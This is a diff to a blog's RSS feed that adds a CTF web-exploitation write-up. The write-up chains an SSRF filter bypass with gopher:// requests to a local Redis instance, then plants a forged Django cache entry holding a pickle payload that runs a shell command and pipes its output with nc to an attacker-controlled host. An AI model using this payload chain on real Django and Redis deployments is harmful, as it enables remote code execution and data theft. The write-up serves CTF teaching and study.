@@ -542,6 +542,54 @@ For example :&lt;/p&gt;
     </item>
     
     <item>
+      <title>Shinobis World - Web Exploitation NCSC 2.0 CTF</title>
+      <link>https://ahmed-belkahla.me/post/shinobisworld/</link>
+      <pubDate>Thu, 23 Jan 2020 00:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/shinobisworld/</guid>
+      <description>&lt;h1 id=&#34;shinobis-world-1000pts-1-solves-&#34;&gt;&lt;strong&gt;Shinobis World (1000pts) (1 Solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/7X3dgtW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/60QSkz4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Our first impression, we see an url fetcher that is curling websites which will be probably some SSRF , we try the usual payloads and we find that file ,localhost and 127.0.0.1 are filtered
+so we can use 127.0.1 and maybe http or gopher protocol , firstly let&amp;rsquo;s think , as we said we had a redis instance that is running on localhost , so may be using the ssrf we can interact with it&lt;/p&gt;
+&lt;p&gt;in fact you can use gopher protocol to interact with redis :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gopher://127.0.1:6379/_RedisCommandHERE&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;for example to list all keys:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gopher://127.0.1:6379/_keys%20*&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;if we refresh the shinobis web page and then list all keys we can see some new keys that are set :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;:1:views.decorators.cache.cache_header..a906279c6f1b8c76747a8ba71e866d8c.en-us.UTC&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/bOKKP3k.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If you read the Django Manual you will find that the caching system in django is a little bit different , first of all django will serialize the header and the rest of the page using pickle then it will cache them in the memory&lt;/p&gt;
+&lt;p&gt;So the idea is to forge our payload using pickle and the set the default key of django (:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC) with our payload , here is what will happen chronologically :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Django will try to load the page so firstly he will check if the :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC key is set&lt;/li&gt;
+&lt;li&gt;if the key is set he will unpickle the data stored there and load the page using this content&lt;/li&gt;
+&lt;li&gt;Our payload will be executed then Bingo we will have the flag :D&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Final Payload :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20&amp;quot;cposix\nsystem\np0\n(S&amp;rsquo;ls|nc YourVPSIP 1234&amp;rsquo;\np1\ntp2\nRp3\n.&amp;rdquo;
+This Payload will execute ls command and send it to our vps (don&amp;rsquo;t forget to refresh the Shinobis page because it&amp;rsquo;s the page that is being cached)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt;&lt;/em&gt; You can find the source code of this task in the source code repo of my github repo&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;I hope that you liked the challenge , i tried to combine the SSRF with this default feature of django that can be used maliciously , it can be applied with any caching system (Memcached or Redis ..)
+If you have any questions dont forget to contact me and if you liked this writeup please star this repo :D&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
       <title>JWT In A New Way - NCSC 2.0 CTF</title>
       <link>https://ahmed-belkahla.me/post/jwt-in-a-new-way/</link>
       <pubDate>Wed, 22 Jan 2020 00:00:00 +0000</pubDate>
